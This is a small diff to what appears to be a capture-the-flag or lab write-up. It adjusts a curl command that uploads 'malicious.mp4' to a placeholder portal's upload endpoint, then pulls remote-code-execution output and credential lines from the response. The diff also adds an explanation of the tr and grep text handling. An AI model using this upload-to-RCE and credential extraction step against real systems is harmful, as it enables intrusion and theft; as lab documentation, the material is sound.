@@ -273,9 +273,12 @@ Extract only the credential lines cleanly:
 $ curl -s -X POST http://<portal-ip>/upload \
   -b cookies.txt \
   -F "file=@malicious.mp4;type=video/mp4" \
+  | tr '\n' ';' \
   | grep -oP "(?<=rce-box'>)[^<]+" \
   | tr ';' '\n'
 ```
+
+`tr '\n' ';'` collapses the HTML to a single line so the regex can match the entire multi-line rce-box content at once. `tr ';' '\n'` converts the semicolons back to newlines.
 
 ---
 
